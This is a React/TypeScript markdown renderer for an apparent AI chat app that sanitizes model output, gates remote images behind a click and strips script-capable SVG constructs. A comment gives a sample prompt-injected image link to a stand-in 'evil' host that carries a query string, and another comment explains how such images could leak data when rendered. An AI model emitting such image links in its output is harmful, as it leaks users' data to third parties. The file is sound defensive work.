import { memo, lazy, Suspense, useMemo, useState } from "react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeKatex from "rehype-katex";
import rehypeSanitize, { defaultSchema } from "rehype-sanitize";
import DOMPurify from "dompurify";
import "katex/dist/katex.min.css";
import type { Source } from "../lib/store";

const Mermaid = lazy(() => import("./Mermaid").then((m) => ({ default: m.Mermaid })));
const CodeBlock = lazy(() => import("./CodeBlock"));
const ChartBlock = lazy(() => import("./ChartBlock"));

// Allow KaTeX's generated markup and our citation links, nothing else.
const schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    "*": [...(defaultSchema.attributes?.["*"] ?? []), "className"],
    span: [...(defaultSchema.attributes?.span ?? []), "className", "style"],
    a: [["href", /^https?:\/\//], "title", ["target", "_blank"], ["rel", "noreferrer noopener"]],
    // data:image/ renders directly (model-generated images); remote URLs go
    // through click-to-load below so a prompt-injected tracker can't ping
    // home just by being rendered.
    img: [["src", /^(https?:\/\/|data:image\/)/], "alt", "title", "loading"],
  },
  protocols: { ...defaultSchema.protocols, href: ["http", "https", "mailto"], src: ["http", "https", "data"] },
};

// Remote images are click-to-load: an injected ![](https://evil/?q=…) must not
// fire on render. data:image/ URLs can't exfiltrate and render immediately.
// Images from our own generation providers auto-load (we minted the URL).
const TRUSTED_IMAGE_SUFFIXES = [
  ".agnes-ai.space",
  ".LucaFlash.space",
  ".blob.core.windows.net",
  "generativelanguage.googleapis.com",
];
function isTrustedImageHost(host: string): boolean {
  const h = host.toLowerCase();
  return TRUSTED_IMAGE_SUFFIXES.some((s) => h === s.replace(/^\./, "") || h.endsWith(s));
}
function downloadImage(src: string, alt?: string) {
  try {
    const a = document.createElement("a");
    a.href = src;
    a.download = (alt || "luca-image").replace(/[^a-z0-9-_]+/gi, "-").slice(0, 60) + ".png";
    a.rel = "noopener";
    document.body.appendChild(a);
    a.click();
    a.remove();
  } catch { window.open(src, "_blank", "noopener"); }
}
function ImageWithDownload({ src, alt, title }: { src: string; alt?: string; title?: string }) {
  return (
    <span className="md-img-wrap">
      <img src={src} alt={alt || ""} title={title} className="md-img" loading="lazy" />
      <button
        type="button"
        className="img-dl"
        aria-label={`Download image${alt ? `: ${alt}` : ""}`}
        title="Download image"
        onClick={(e) => { e.stopPropagation(); downloadImage(src, alt); }}
      >
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" /><polyline points="7 10 12 15 17 10" /><line x1="12" y1="15" x2="12" y2="3" /></svg>
      </button>
    </span>
  );
}
function SafeImage({ src, alt, title }: { src?: string; alt?: string; title?: string }) {
  const [loaded, setLoaded] = useState(false);
  const s = String(src || "");
  if (!s) return null;
  if (s.startsWith("data:image/")) {
    return <ImageWithDownload src={s} alt={alt} title={title} />;
  }
  let host = "";
  try { host = new URL(s).hostname.replace(/^www\./, ""); } catch { return null; }
  if (isTrustedImageHost(host)) {
    return <ImageWithDownload src={s} alt={alt} title={title} />;
  }
  if (!loaded) {
    return (
      <button type="button" className="img-gate" onClick={() => setLoaded(true)}>
        <span className="img-gate-domain">{host || "external image"}</span>
        <span className="img-gate-hint">Click to load — external images can track views</span>
      </button>
    );
  }
  return <ImageWithDownload src={s} alt={alt} title={title} />;
}

// Citation binder: unknown ids are left untouched (arr[10] must survive).
export function bindCitations(text: string, sources?: Source[]): string {
  if (!sources?.length) return text;
  const byId = new Map(sources.map((s) => [s.id, s]));
  const bind = (_whole: string, n: string) => {
    const src = byId.get(Number(n));
    return src ? `[${n}](${src.url} "${src.domain} — ${src.title}")` : _whole; // ← was ""
  };
  return text
    .replace(/\[(\d{1,2})\](?!\()/g, bind)
    .replace(/【(\d{1,2})[^】]*】/g, bind);
}

type Fence =
  | { kind: "md"; body: string }
  | { kind: "mermaid"; code: string }
  | { kind: "chart"; code: string }
  | { kind: "viz"; vizType: string; code: string }
  | { kind: "code"; lang: string; code: string };

function splitFences(md: string): Fence[] {
  const out: Fence[] = [];
  const parts = md.split("```");
  for (let i = 0; i < parts.length; i++) {
    const part = parts[i] ?? "";
    if (i % 2 === 1) {
      const nl = part.indexOf("\n");
      const lang = (nl === -1 ? "" : part.slice(0, nl)).trim().toLowerCase();
      const code = (nl === -1 ? part : part.slice(nl + 1)).replace(/\n$/, "");
      if (lang === "mermaid" || lang === "viz:mermaid" || lang.startsWith("xychart") || lang === "viz:xychart" || lang === "viz:xychart-beta") out.push({ kind: "mermaid", code });
      else if (lang === "chart-data" || lang === "viz:chart") out.push({ kind: "chart", code });
      else if (lang === "viz:svg" || lang === "viz:html") out.push({ kind: "viz", vizType: lang.split(":")[1] ?? "svg", code });
      else out.push({ kind: "code", lang, code });
      continue;
    }
    if (part) out.push({ kind: "md", body: part });
  }
  return out;
}

// viz:svg from model output — DOMPurify SVG profile with script-capable and
// exfil-capable constructs forbidden (style/foreignObject/use/a + inline
// style), never regex-stripping.
function InlineSvg({ raw }: { raw: string }) {
  const clean = useMemo(() => {
    try {
      const out = DOMPurify.sanitize(raw, {
        USE_PROFILES: { svg: true },
        FORBID_TAGS: ["style", "foreignObject", "use", "a", "script", "iframe", "embed", "object"],
        FORBID_ATTR: ["style", "href", "xlink:href", "onclick", "onload", "onerror", "onmouseover", "onmouseout", "onfocus", "onblur", "onbegin", "onend", "onrepeat", "onactivate"],
      });
      if (!out.trim().toLowerCase().startsWith("<svg")) return null;
      return out;
    } catch {
      return null;
    }
  }, [raw]);
  if (!clean) return <pre className="viz-fallback"><code>{raw}</code></pre>;
  return <div className="inline-viz" dangerouslySetInnerHTML={{ __html: clean }} />;
}

function MdChunk({ body, sources }: { body: string; sources?: Source[] }) {
  const text = useMemo(() => bindCitations(body, sources), [body, sources]);
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm, remarkMath]}
      rehypePlugins={[rehypeKatex, [rehypeSanitize, schema]]}
      // Take over URL filtering entirely: rehype-sanitize (schema above) +
      // SafeImage already decide what loads. The default transform would
      // silently blank data: URLs (model-generated images) before we see them.
      urlTransform={(url) => url}
      components={{
        // eslint-disable-next-line jsx-a11y/anchor-has-content -- link text comes from markdown at runtime
        a: (p) => <a {...p} target="_blank" rel="noreferrer noopener" />,
        table: (p) => <div className="table-wrap"><table {...p} /></div>,
        // Model-authored # headings would otherwise duplicate the thread's own
        // <h1> (App topbar): demote three levels so the outline stays sane.
        h1: (p) => <h3 {...p} />,
        h2: (p) => <h4 {...p} />,
        h3: (p) => <h5 {...p} />,
        img: (p) => {
          const { src, alt, title } = p as { src?: string; alt?: string; title?: string };
          return <SafeImage src={src} alt={alt} title={title} />;
        },
        code({ className, children, ...rest }) {
          const m = /language-([\w#+.-]+)/.exec(className || "");
          const raw = String(children ?? "").replace(/\n$/, "");
          if (!m) return <code className={className} {...rest}>{children}</code>;
          return <Suspense fallback={<pre>{raw}</pre>}><CodeBlock lang={m[1] ?? ""} code={raw} /></Suspense>;
        },
      }}
    >{text}</ReactMarkdown>
  );
}

export default memo(function Markdown({ text, sources, live }: { text: string; sources?: Source[]; live?: boolean }) {
  const fences = useMemo(() => splitFences(text), [text]);
  return (
    <div className="md">
      {fences.map((f, i) => {
        if (f.kind === "mermaid") return <Suspense key={i} fallback={<pre>{f.code}</pre>}><Mermaid code={f.code} defer={live} /></Suspense>;
        if (f.kind === "chart") return <Suspense key={i} fallback={<pre>{f.code}</pre>}><ChartBlock code={f.code} /></Suspense>;
        if (f.kind === "viz") {
          if (f.vizType === "svg") return <InlineSvg key={i} raw={f.code} />;
          return <pre key={i} className="viz-fallback"><code>{f.code}</code></pre>;
        }
        if (f.kind === "code") {
          if (!f.lang) return <pre key={i}><code>{f.code}</code></pre>;
          return <Suspense key={i} fallback={<pre>{f.code}</pre>}><CodeBlock lang={f.lang} code={f.code} /></Suspense>;
        }
        return <MdChunk key={i} body={f.body} sources={sources} />;
      })}
    </div>
  );
});
